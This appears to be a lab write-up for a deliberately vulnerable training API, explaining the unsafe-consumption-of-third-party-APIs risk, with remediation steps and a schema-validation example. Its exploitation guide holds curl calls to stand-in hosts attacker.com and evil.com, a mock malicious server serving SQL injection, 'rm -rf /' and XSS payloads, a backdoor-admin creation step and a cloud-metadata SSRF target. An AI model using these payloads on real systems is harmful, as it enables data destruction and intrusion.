API10:2023 Unsafe Consumption of APIs

MEDIUM SEVERITY

Description

Developers tend to trust data received from third-party APIs more than user input, leading to weaker security standards. Attackers may target third-party services to get their malicious payload processed by your API, or exploit the trust relationship between your API and external services.

Affected Files

  • app/routes/files.py - import-data endpoint trusts external API data
  • app/utils.py - process_external_data function

Exploitation Guide

1. Malicious External API Response

The import-data endpoint fetches and processes external API data without validation:

# Get auth token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "john", "password": "password123"}' | jq -r '.token')

# Set up a malicious server that returns crafted data
# Example malicious response:
# {
#   "operations": [
#     {"type": "delete_all_users"},
#     {"type": "export_database"},
#     {"type": "create_admin", "data": {"username": "backdoor"}}
#   ]
# }

# Point the API to your malicious server
curl -X POST http://localhost:5000/api/files/import-data \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"api_url": "http://attacker.com/malicious-api"}'

2. Simulate Malicious API with Local Server

Create a simple malicious API server:

# malicious_server.py
from flask import Flask, jsonify
app = Flask(__name__)

@app.route('/api/data')
def malicious_data():
    return jsonify({
        "operations": [
            {"type": "sql_injection", "query": "'; DROP TABLE users; --"},
            {"type": "command_injection", "cmd": "rm -rf /"},
            {"type": "xss_payload", "data": "<script>alert('XSS')</script>"}
        ],
        "users": [
            {"username": "admin", "role": "admin", "password": "hacked"},
            {"username": "<script>alert(1)</script>", "email": "xss@evil.com"}
        ]
    })

if __name__ == '__main__':
    app.run(port=9999)

# Run the malicious server
python malicious_server.py &

# Now point VulnAPI to consume it
curl -X POST http://localhost:5000/api/files/import-data \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"api_url": "http://localhost:9999/api/data"}'

3. SSRF Chain via External API

External API could redirect to internal resources:

# The external API could return data that includes URLs to fetch:
# {
#   "webhooks": ["http://169.254.169.254/latest/meta-data/"],
#   "resources": ["http://internal-db:5432/"]
# }

# If the API processes these URLs, it creates an SSRF chain

4. Data Injection via External Source

External data is trusted and processed directly:

# The vulnerable code:
# def process_external_data(data):
#     return data  # No validation!

# If this data ends up in:
# - SQL queries: SQL injection
# - HTML templates: XSS
# - System commands: Command injection
# - File operations: Path traversal

5. Webhook Exploitation

Webhooks can be used to inject malicious data:

# Register webhook that returns malicious data
curl -X POST http://localhost:5000/api/files/webhook \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"webhook_url": "http://evil.com/webhook", "event": "order_created"}'

# The webhook endpoint at evil.com could return:
# {
#   "callback_url": "http://internal-admin/delete-all",
#   "data": {"sql": "DROP TABLE orders;"}
# }

6. JSON Parsing Attacks

Malformed or oversized JSON from external APIs:

# External API returns extremely nested JSON (billion laughs attack)
# {
#   "a": {"b": {"c": {"d": ... }}}  // Deeply nested
# }

# Or extremely large responses
# { "data": "A" * 10000000000 }  // Memory exhaustion

# Or duplicate keys exploiting parser inconsistencies
# {"admin": false, "admin": true}

Real-World Scenarios

Scenario 1: Third-Party Price API

# Your API trusts a third-party pricing service
# Attacker compromises the pricing API and returns:
{
  "product_id": 1,
  "price": -1000  // Negative price!
}

# Your API processes this and credits the user's account

Scenario 2: Partner Data Feed

# Partner API sends user data that's inserted into your database
# Malicious partner sends:
{
  "users": [
    {"name": "'; DELETE FROM users; --", "email": "sql@inject.com"}
  ]
}

# Without validation, this causes SQL injection

Scenario 3: OAuth Provider Compromise

# You trust the OAuth provider's user info
# Compromised provider returns:
{
  "sub": "admin",
  "email": "hacker@evil.com",
  "role": "administrator"  // Privilege escalation via trusted source
}

Impact

  • Supply Chain Attack: Compromised third-party leads to your compromise
  • Data Injection: Malicious data processed without validation
  • Privilege Escalation: External data sets user roles
  • Denial of Service: Malformed data crashes your API
  • SSRF Chain: External API redirects to internal resources

Remediation

  1. Validate ALL data from external APIs (same as user input)
  2. Use schema validation (JSON Schema) for external data
  3. Implement request/response size limits
  4. Use allowlists for expected values
  5. Don't trust external data for authorization decisions
  6. Sanitize external data before storage or display
  7. Monitor third-party API responses for anomalies
  8. Use API contracts and validate responses against them
# Secure implementation
def process_external_data(data):
    # Validate against schema
    schema = {
        "type": "object",
        "properties": {
            "name": {"type": "string", "maxLength": 100},
            "price": {"type": "number", "minimum": 0}
        },
        "required": ["name", "price"]
    }
    validate(data, schema)  # Raises if invalid

    # Sanitize strings
    data['name'] = bleach.clean(data['name'])

    # Validate business logic
    if data['price'] > MAX_PRICE:
        raise ValueError("Price exceeds maximum")

    return data
